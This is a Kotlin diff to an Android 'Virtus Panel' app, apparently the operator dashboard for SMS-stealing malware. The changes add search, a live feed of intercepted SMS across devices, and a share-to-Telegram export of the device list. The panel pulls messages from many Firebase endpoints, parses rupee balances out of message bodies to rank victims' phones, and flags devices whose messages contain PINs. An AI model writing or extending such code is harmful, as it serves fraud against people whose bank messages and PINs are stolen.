@@ -1,8 +1,10 @@
 package com.firebasepanel.sms.ui
 
+import android.app.Application
 import android.content.Context
+import android.content.Intent
 import android.net.Uri
-import androidx.lifecycle.ViewModel
+import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import com.firebasepanel.sms.domain.ConnectionFilter
 import com.firebasepanel.sms.domain.FetchResult
@@ -56,6 +58,18 @@ data class SmsRow(
     val kindLabel: String,
 )
 
+/** Compact row for dashboard live SMS strip (all filtered devices). */
+data class LiveSmsRow(
+    val deviceId: String,
+    val firebaseUrl: String,
+    val sender: String,
+    val body: String,
+    val balance: Double?,
+    val messageAtMillis: Long?,
+    val online: Boolean,
+    val kindLabel: String,
+)
+
 data class UiState(
     val urlsLoaded: Int = 0,
     val fetching: Boolean = false,
@@ -65,6 +79,8 @@ data class UiState(
     val devices: List<DeviceRow> = emptyList(),
     val selected: DeviceDetail? = null,
     val error: String? = null,
+    val searchQuery: String = "",
+    val liveFeedSms: List<LiveSmsRow> = emptyList(),
     val config: FilterConfig =
         FilterConfig(
             sortMode = SortMode.HIGH_TO_LOW,
@@ -75,7 +91,7 @@ data class UiState(
         ),
 )
 
-class PanelViewModel : ViewModel() {
+class PanelViewModel(application: Application) : AndroidViewModel(application) {
     private val _state = MutableStateFlow(UiState())
     val state: StateFlow<UiState> = _state.asStateFlow()
 
@@ -85,6 +101,12 @@ class PanelViewModel : ViewModel() {
 
     fun updateConfig(block: (FilterConfig) -> FilterConfig) {
         _state.update { it.copy(config = block(it.config)) }
+        applyFilters()
+    }
+
+    fun setSearchQuery(q: String) {
+        _state.update { it.copy(searchQuery = q) }
+        applyFilters()
     }
 
     fun setInboxMode(mode: InboxMode) {
@@ -152,14 +174,44 @@ class PanelViewModel : ViewModel() {
 
     fun applyFilters() {
         val cfg = _state.value.config
-        val devices = buildDeviceList(lastResults, cfg)
-        _state.update { it.copy(devices = devices, selected = null) }
+        val q = _state.value.searchQuery.trim().lowercase()
+        val devices = buildDeviceList(lastResults, cfg, q)
+        val liveFeed = buildLiveFeedList(lastResults, cfg, q)
+        _state.update { it.copy(devices = devices, liveFeedSms = liveFeed, selected = null) }
     }
 
     fun selectDevice(row: DeviceRow) {
         val cfg = _state.value.config
         val detail = buildDeviceDetail(lastResults, row, cfg)
         _state.update { it.copy(selected = detail) }
+    }
+
+    /** Share current device list as plain text (Drive, Telegram, etc.). */
+    fun exportDeviceListTxt() {
+        val list = _state.value.devices
+        if (list.isEmpty()) return
+        val text =
+            buildString {
+                appendLine("Virtus Panel — devices (${list.size})")
+                appendLine()
+                list.forEachIndexed { i, d ->
+                    val pin = if (d.deviceHasPin) "PIN" else "—"
+                    appendLine(
+                        "${i + 1}. ${d.deviceId}  |  ${if (d.online) "ON" else "OFF"}  |  $pin  |  max ₹${d.maxBalance.toLong()}  |  ${d.smsCount} SMS",
+                    )
+                    appendLine("   ${d.firebaseUrl}")
+                    appendLine()
+                }
+            }
+        val app = getApplication<Application>()
+        val send =
+            Intent(Intent.ACTION_SEND).apply {
+                type = "text/plain"
+                putExtra(Intent.EXTRA_TEXT, text)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+        val chooser = Intent.createChooser(send, "Export TXT").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        app.startActivity(chooser)
     }
 
     fun clearSelection() {
@@ -216,7 +268,26 @@ private fun smsKindLabel(cfg: FilterConfig): String {
     }
 }
 
-private fun buildDeviceList(results: List<FetchResult>, cfg: FilterConfig): List<DeviceRow> {
+private fun matchesSearch(
+    devId: String,
+    firebaseUrl: String,
+    msgs: List<RawSms>,
+    query: String,
+): Boolean {
+    if (query.isEmpty()) return true
+    if (devId.lowercase().contains(query)) return true
+    if (firebaseUrl.lowercase().contains(query)) return true
+    return msgs.any { sms ->
+        sms.sender.lowercase().contains(query) || sms.body.lowercase().contains(query)
+    }
+}
+
+private fun buildDeviceList(
+    results: List<FetchResult>,
+    cfg: FilterConfig,
+    searchQuery: String,
+): List<DeviceRow> {
+    val q = searchQuery.trim().lowercase()
     val rows = mutableListOf<DeviceRow>()
     for (fr in results) {
         if (!connectionOk(fr.online, cfg.connection)) continue
@@ -224,6 +295,7 @@ private fun buildDeviceList(results: List<FetchResult>, cfg: FilterConfig): List
         for ((devId, msgs) in byDev) {
             val devicePin = deviceHasPinMessages(msgs)
             if (!pinOkForDevice(devicePin, cfg.pinFilter, cfg.inboxMode)) continue
+            if (!matchesSearch(devId, fr.url, msgs, q)) continue
             val filtered = filterSmsList(msgs, cfg)
             if (filtered.isEmpty()) continue
             val balances = filtered.mapNotNull { mainBalanceForSort(it.body) }
@@ -254,6 +326,45 @@ private fun buildDeviceList(results: List<FetchResult>, cfg: FilterConfig): List
             }
         else -> rows.sortedByDescending { it.lastActivityMillis }
     }
+}
+
+/** Recent SMS across all devices that pass filters + search (for live strip). */
+private fun buildLiveFeedList(
+    results: List<FetchResult>,
+    cfg: FilterConfig,
+    searchQuery: String,
+    cap: Int = 60,
+): List<LiveSmsRow> {
+    val q = searchQuery.trim().lowercase()
+    val out = mutableListOf<LiveSmsRow>()
+    val label = smsKindLabel(cfg)
+    for (fr in results) {
+        if (!connectionOk(fr.online, cfg.connection)) continue
+        val byDev = fr.sms.groupBy { deviceIdFromPath(it.rawPath) }
+        for ((devId, msgs) in byDev) {
+            val devicePin = deviceHasPinMessages(msgs)
+            if (!pinOkForDevice(devicePin, cfg.pinFilter, cfg.inboxMode)) continue
+            if (!matchesSearch(devId, fr.url, msgs, q)) continue
+            val filtered = filterSmsList(msgs, cfg)
+            for (sms in filtered) {
+                out.add(
+                    LiveSmsRow(
+                        deviceId = devId,
+                        firebaseUrl = fr.url,
+                        sender = sms.sender.ifBlank { "(unknown)" },
+                        body = sms.body,
+                        balance = mainBalanceForSort(sms.body),
+                        messageAtMillis = sms.messageAtMillis,
+                        online = fr.online,
+                        kindLabel = label,
+                    ),
+                )
+            }
+        }
+    }
+    return out
+        .sortedByDescending { it.messageAtMillis ?: 0L }
+        .take(cap)
 }
 
 private fun buildDeviceDetail(results: List<FetchResult>, row: DeviceRow, cfg: FilterConfig): DeviceDetail? {
